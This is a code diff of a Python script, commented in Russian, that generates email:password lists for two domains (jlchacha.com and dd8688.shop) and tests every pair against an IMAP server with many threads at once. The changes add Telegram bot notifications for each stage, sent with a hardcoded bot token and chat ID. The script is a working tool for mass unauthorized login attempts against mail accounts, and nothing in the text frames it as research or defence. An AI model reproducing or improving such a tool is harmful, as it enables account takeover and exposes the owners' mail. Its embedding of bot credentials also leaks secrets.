@@ -5,7 +5,7 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 
 # Настройки для Telegram Bot API
-TELEGRAM_BOT_TOKEN = "7859317490:AAHi6lghknwbKU0fPHULZKyl42aGcG1lNyM"
+TELEGRAM_BOT_TOKEN = '7859317490:AAHi6lghknwbKU0fPHULZKyl42aGcG1lNyM'
 CHAT_ID = '7412395676'
 
 # Глобальные счетчики
@@ -31,6 +31,7 @@ def save_to_file(filename, content):
 
 # Генерация email:password для jlchacha.com
 def generate_emails_jlchacha():
+    send_telegram_message("Генерация почты для jlchacha.com начата.")  # Уведомление о начале генерации
     numbers = list(range(1000000))  # Числа от 000000 до 999999
     random.shuffle(numbers)
     with open('emails_jlchacha.txt', 'w') as file:
@@ -38,16 +39,19 @@ def generate_emails_jlchacha():
             formatted_number = f"{number:06}"
             email = f"jl{formatted_number}@jlchacha.com:chacha123\n"
             file.write(email)
+    send_telegram_message("Генерация почты для jlchacha.com завершена.")  # Уведомление о завершении генерации
 
 # Генерация email:password для dd8688.shop
 def generate_emails_dd8688():
-    numbers = list(range(100000))
+    send_telegram_message("Генерация почты для dd8688.shop начата.")  # Уведомление о начале генерации
+    numbers = list(range(100000))  # Числа от 00000 до 99999
     random.shuffle(numbers)
     with open('emails_dd8688.txt', 'w') as file:
         for number in numbers:
             formatted_number = f"{number:05}"
             email = f"up{formatted_number}@dd8688.shop:367498\n"
             file.write(email)
+    send_telegram_message("Генерация почты для dd8688.shop завершена.")  # Уведомление о завершении генерации
 
 # Проверка логина по IMAP
 def check_imap_login(email, password, imap_server, imap_port=993):
@@ -84,6 +88,7 @@ def check_imap_login(email, password, imap_server, imap_port=993):
 
 # Многопоточная проверка email из файла
 def check_emails_from_file(filename, imap_server, threads=10, imap_port=993):
+    send_telegram_message("Начинается проверка аккаунтов.")  # Уведомление о начале проверки
     with open(filename, 'r') as file:
         emails = [line.strip().split(':') for line in file]
     # Используем ThreadPoolExecutor для многопоточности
@@ -94,6 +99,9 @@ def check_emails_from_file(filename, imap_server, threads=10, imap_port=993):
                 future.result()  # Это будет блокировать, пока проверка не завершится
             except Exception as e:
                 print(f"Ошибка при проверке {futures[future]}: {e}")
+
+# Запуск бота
+send_telegram_message("Бот запущен.")  # Уведомление о запуске бота
 
 # Генерация email и паролей
 generate_emails_jlchacha()  # Генерация для домена jlchacha.com
